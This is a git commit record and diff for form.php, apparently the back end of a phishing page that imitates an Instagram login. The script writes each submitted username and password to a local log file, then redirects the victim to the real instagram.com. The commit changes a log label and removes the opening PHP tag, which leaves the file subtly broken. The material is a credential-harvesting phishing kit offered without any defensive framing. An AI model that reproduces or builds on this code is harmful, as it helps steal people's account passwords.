a711650009de6e21acc58a44df1427bb10c4be9a
mihnev22 <foodbolho@gmail.com>
2024-11-17 04:44:52 +0200

    Update form.php

--- form.php
+++ form.php
@@ -1,11 +1,9 @@
-<?php
-
 $username = $_POST["username"];
 $password = $_POST["password"];
 
 $fp = fopen("log.txt", "a");
 fwrite($fp,"Username: " . $username);
-fwrite($fp,"Password: " . $password);
+fwrite($fp,"password: " . $password);
 fclose($fp);
 
 header("Location: https://instagram.com");
